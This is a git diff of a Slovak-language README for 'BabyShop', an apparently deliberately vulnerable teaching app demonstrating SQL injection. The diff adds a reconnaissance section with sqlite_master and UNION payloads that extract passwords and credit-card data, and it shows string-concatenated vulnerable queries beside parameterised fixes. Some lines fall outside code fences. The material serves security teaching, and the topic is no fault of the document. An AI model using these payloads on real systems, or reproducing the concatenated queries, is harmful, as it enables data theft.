@@ -1,4 +1,4 @@
-# BabyShop – SQL Injection Demo
+# BabyShop - SQL Injection Demo
 
 Webová aplikácia demonštrujúca SQL Injection útok.  
 Jedna aplikácia, dve verzie dostupné cez rôzne URL.
@@ -35,7 +35,7 @@ Aplikácia vráti okrem kočíkov aj všetkých používateľov s heslami z tabu
 
 **Prečo to funguje – SQL dotaz ktorý sa vykoná:**
 ```sql
-SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
+SELECT * FROM prod WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
 ```
 Apostrof `'` uzavrie reťazec, `UNION` pridá druhý dotaz, `--` zakomentuje zvyšok.
 
@@ -49,7 +49,7 @@ Apostrof `'` uzavrie reťazec, `UNION` pridá druhý dotaz, `--` zakomentuje zvy
 
 **Čo zadáš do vyhľadávacieho poľa:**
 ```
-' UNION SELECT id, full_name, credit_card, email FROM customers--
+' UNION SELECT id, f_name, credit_card, email FROM customers--
 ```
 
 **Čo sa stane:**
@@ -57,10 +57,32 @@ Aplikácia vráti mená zákazníkov, čísla kreditných kariet a emaily priamo
 
 **Prečo to funguje – SQL dotaz ktorý sa vykoná:**
 ```sql
-SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, full_name, credit_card, email, 1 FROM customers--%'
+SELECT * FROM prod WHERE name LIKE '%' UNION SELECT id, f_name, credit_card, email FROM customers--%'
 ```
 
 **Na secure verzii** (`/secure/search`) ten istý vstup nájde 0 výsledkov.
+
+---
+
+## Recon krok – zistenie struktury DB
+
+Utocnik zvycajne nepozna nazvy tabuliek ani stlpcov. Zisti ich cez SQLite systemovu tabulku `sqlite_master`:
+
+**Krok 1 – zoznam tabuliek a ich stlpcov:**
+```
+' UNION SELECT name, sql, 1, 1 FROM sqlite_master WHERE type='table'--
+```
+
+Vysledok vrati pre kazdu tabulku jej `CREATE TABLE` statement – teda presne nazvy stlpcov.
+Napr. pre `users` vidi: `id, username, password, role`
+Pre `customers` vidi: `id, f_name, last_name, email, phone, address, credit_card, date_of_birth`
+
+**Krok 2 – az potom zadá cieleny UNION:**
+```
+' UNION SELECT id, username, password, role FROM users--
+```
+' UNION SELECT id, f_name, credit_card, phone FROM customers--
+CREATE TABLE customers ( id INTEGER PRIMARY KEY AUTOINCREMENT, f_name TEXT NOT NULL, last_name TEXT NOT NULL, email TEXT NOT NULL, phone TEXT, address TEXT, credit_card TEXT, date_of_birth TEXT )
 
 ---
 
@@ -92,17 +114,17 @@ SELECT * FROM users WHERE username = 'admin'--' AND password = 'cokokvek'
 
 ### Vulnerable (zraniteľné)
 ```python
-# Vyhľadávanie
-sql = "SELECT * FROM products WHERE name LIKE '%" + q + "%'"
+# Vyhladavanie
+sql = "SELECT * FROM prod WHERE name LIKE '%" + q + "%'"
 
 # Login
 sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
 ```
 
-### Secure (zabezpečené)
+### Secure (zabezpecene)
 ```python
-# Vyhľadávanie
-sql = "SELECT * FROM products WHERE name LIKE ?"
+# Vyhladavanie
+sql = "SELECT * FROM prod WHERE name LIKE ?"
 rows = conn.execute(sql, (f"%{q}%",)).fetchall()
 
 # Login
